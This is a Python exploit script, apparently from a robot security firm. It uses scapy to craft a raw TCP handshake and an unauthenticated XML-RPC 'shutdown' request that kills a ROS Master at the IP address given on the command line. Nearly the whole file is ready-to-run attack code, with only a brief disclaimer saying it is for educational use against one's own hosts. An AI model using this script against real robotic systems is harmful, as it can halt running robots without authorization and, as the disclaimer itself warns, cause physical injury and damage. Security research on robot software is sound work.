"""
Kill ROS Master using undocumented API functions, nothing fancy.
    Found with some silly fuzz testing.

- Authors: Víctor Mayoral Vilches <victor@aliasrobotics.com>
- Description: Shutdown ROS Master using its API

DISCLAIMER: Use against your own hosts only! By no means Alias Robotics
or the authors of this exploit encourage or promote the unauthorized tampering
with running robotic systems. This can cause serious human harm and material
damages. This is for educational purposes only.
"""

from scapy.all import *
from scapy.layers.inet import TCP, IP
from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse
from scapy.layers.l2 import Ether
from scapy.contrib.tcpros import *
# from fuzzingbook.Fuzzer import RandomFuzzer
import sys
import random
from datetime import datetime
from subprocess import Popen, PIPE

# import rospy

# bind layers so that packages are recognized as TCPROS
bind_layers(TCP, TCPROS)
bind_layers(HTTPRequest, XMLRPC)
bind_layers(HTTPResponse, XMLRPC)
# bind_layers(HTTPROSRequest, XMLRPC)
# bind_layers(HTTPROSResponse, XMLRPC)

###################################################################################
# VARIABLES
###################################################################################

source = "192.168.2.5"
# or even its own.
random.seed(datetime.now())

package_shutdown = (
    IP(version=4, ihl=5, tos=0, flags=2, dst="192.168.2.6")
    / TCP(
        sport=20001,
        dport=11311,
        seq=1,
        flags="PA",
        ack=1,
    )
    / TCPROS()
    / HTTP()
    / HTTPRequest(
        Accept_Encoding=b"gzip",
        Content_Length=b"227",
        Content_Type=b"text/xml",
        Host=b"192.168.2.6:11311",
        User_Agent=b"xmlrpclib.py/1.0.1 (by www.pythonware.com)",
        Method=b"POST",
        Path=b"/RPC2",
        Http_Version=b"HTTP/1.1",
    )
    / XMLRPC()
    / XMLRPCCall(
        version=b"<?xml version='1.0'?>\n",
        methodcall_opentag=b"<methodCall>\n",
        methodname_opentag=b"<methodName>",
        methodname=b"shutdown",
        methodname_closetag=b"</methodName>\n",
        params_opentag=b"<params>\n",
        params=b"<param>\n<value><string>/rosparam-92418</string></value>\n</param>\n<param>\n<value><string>4L145_R080T1C5</string></value>\n</param>\n",
        params_closetag=b"</params>\n",
        methodcall_closetag=b"</methodCall>\n",
    )
)


###################################################################################
# GENERAL FUNCTIONS
###################################################################################


def yellow(text):
    print("\033[33m", text, "\033[0m", sep="")


def red(text):
    print("\033[31m", text, "\033[0m", sep="")


def gray(text):
    print("\033[90m", text, "\033[0m", sep="")


def magenta(text):
    print("\033[35m", text, "\033[0m", sep="")


def log_events(log_info, type_event):
    """
    Log events for post-analysis

    param log_info, scapy package
    param type_event: str, either "fuzzing", "weird" or "error"
    """

    log_msg = (
        "["
        + time.ctime()
        + "]"
        + "\n\n"
        + log_info.command()
        + "\n\n"
        + raw(log_info).decode("iso-8859-1")
    )
    # log_msg_encoded = log_info

    if type_event == "fuzzing":
        try:
            fd = open("fuzz.log", "a")
        except IOError as err:
            return "[!] Error opening log file: %s" % str(err)

    elif type_event == "error":
        try:
            fd = open("error.log", "a")
        except IOError as err:
            return "[!] Error opening error file: %s" % str(err)

    elif type_event == "weird":
        try:
            fd = open("weird.log", "a")
        except IOError as err:
            return "[!] Error opening error file: %s" % str(err)

    else:
        return "[!] '%s' is an unrecognized log event type." % type_event

    if fd:
        fd.write(log_msg)

    return


def preamble():
    """
    ROS XMLRPC preamble

    returns: bool, indicating if successful
    """
    # send the SYN, receive response
    p_attack = IP(version=4, frag=0, ttl=64, proto=6, dst=destination) / TCP(
        sport=origin_port, dport=11311, seq=0, ack=0, flags=2
    )
    ans = sr1(p_attack, retry=0, timeout=1)
    # ans = srp1(p_attack, retry=0, timeout=1)

    if ans and len(ans) > 0 and ans[TCP].flags == "SA":
        # print(ans.summary())  # debug
        # ls(ans)  # debug

        # send the ACK
        p_attack = IP(
            version=4, ihl=5, flags=2, frag=0, ttl=64, proto=6, dst=destination
        ) / TCP(
            sport=origin_port,
            dport=11311,
            flags=16,
            seq=ans[TCP].ack,
            ack=ans[TCP].seq + 1,
        )
        send(p_attack)
        return True, ans
    else:
        return False, ans


def process_xmlrpc_response(p_attack, ans, unans, field_name=None):
    """
    Abstracts how the different functions process the XMLRPC responses
    for logging and analysis purposes.

    param p_attack: package used during the attack
    param ans: first result from scapy sr
    param uans: second result from scapy sr
    param field_name: field_name to consider when logging/evaluating

    Essentially:
    1. makes sure that there's an answer
    2. fetches the field to evaluate (or None)
    3. Checks results and responses and logs accordingly
    """

    # check if there's been an answer at all
    if len(ans) > 0:
        # ans.show()  # debug
        # print(list(ans[0][1])[0][XMLRPC])  # debug
        # print(ans[0][1][1][XMLRPC])  # debug

        response = list(ans[0][1])[0]
        if response == None:
            red("response None")

        # give it some colour for visual debugging:
        # print(response[XMLRPC])

        # print(response)  # debug
        # print(type(response))  # debug
        # print(b"Error" in response)  # debug
        # print(b"Error" in raw(response))  # debug

        field_evaluated = getattr(p_attack, field_name)

        if (
            b"Error" in raw(response)
            or b"is not set" in raw(response)
            or b"Exception" in raw(response)
            or b"missing required caller_id" in raw(response)
        ):
            red(response[XMLRPC])
            if not field_evaluated in errors_list:
                log_events(p_attack[XMLRPC], "error")
                errors_list.append(field_evaluated)

        # params, /rosdistro
        elif (
            b"melodic" in raw(response)  # hardcoded for testing setup
            and b"<int>1</int>" in raw(response)
            and field_name == "params"
        ):
            yellow(response[XMLRPC])
            if not field_evaluated in valid_list:
                log_events(p_attack[XMLRPC], "fuzzing")
                valid_list.append(field_evaluated)

        # params, setParam
        elif (
            b"parameter" in raw(response)  # hardcoded for testing setup
            and b"<int>1</int>" in raw(response)
            and b"set" in raw(response)
            # and b"<int>0</int>" in raw(response)
            and field_name == "params"
        ):
            yellow(response[XMLRPC])
            if not field_evaluated in valid_list:
                log_events(p_attack[XMLRPC], "fuzzing")
                valid_list.append(field_evaluated)

        # getPid
        elif b"<int>1</int>" in raw(response) and field_name == "methodname":
            yellow(response[XMLRPC])
            if not field_evaluated in valid_list:
                log_events(p_attack[XMLRPC], "fuzzing")
                valid_list.append(field_evaluated)

        else:
            #  something weird happened, review
            magenta(response[XMLRPC])
            if not field_evaluated in weird_list:
                log_events(p_attack[XMLRPC], "weird")
                weird_list.append(field_evaluated)

        #################
        # send the ACK so that we don't get spammed for retransmissions
        #################

        ack = IP(
            version=4, ihl=5, flags=2, frag=0, ttl=64, proto=6, dst="192.168.2.6"
        ) / TCP(
            sport=origin_port,
            dport=11311,
            flags=16,
            seq=response[TCP].ack,
            ack=len(response[TCP].payload) + response[TCP].seq,
        )
        send(ack)


###################################################################################
# ATTACKS
###################################################################################


def shutdown():
    """
    Call the shutdown method from the external API defined as:

        Stop this server
        @param caller_id: ROS caller id
        @type  caller_id: str
        @param msg: a message describing why the node is being shutdown.
        @type  msg: str
        @return: [code, msg, 0]
        @rtype: [int, str, int]

    """
    success, ans = preamble()
    if success:

        # Using default packages
        p_attack = package_shutdown
        p_attack[IP].dst = destination
        p_attack[TCP].sport = origin_port
        p_attack[TCP].seq = ans[TCP].ack
        p_attack[TCP].ack = ans[TCP].seq + 1

        # adjust size of XMLRPC package payload
        p_attack[HTTPRequest].Content_Length = str(
            len(p_attack[HTTPRequest].payload)
        ).encode("iso-8859-1")

        # gray(p_attack[XMLRPC].params)  # debug package to send
        ans, unans = sr(p_attack, timeout=5)

        # process the response coherently and return ACK
        process_xmlrpc_response(p_attack, ans, unans, "params")


###################################################################################
# CORE LOGIC
###################################################################################

# ##############################
# # fuzzing getParam
# ##############################
weird_list = []  # list containing weird/non-accounted responses
errors_list = []  #  a list containing each
valid_list = []

print(conf.iface)

if len(sys.argv) < 2:
    print("Supply IP as a first argument")
else:
    origin_port = random.randint(12000, 65000)
    destination = sys.argv[1]
    shutdown()
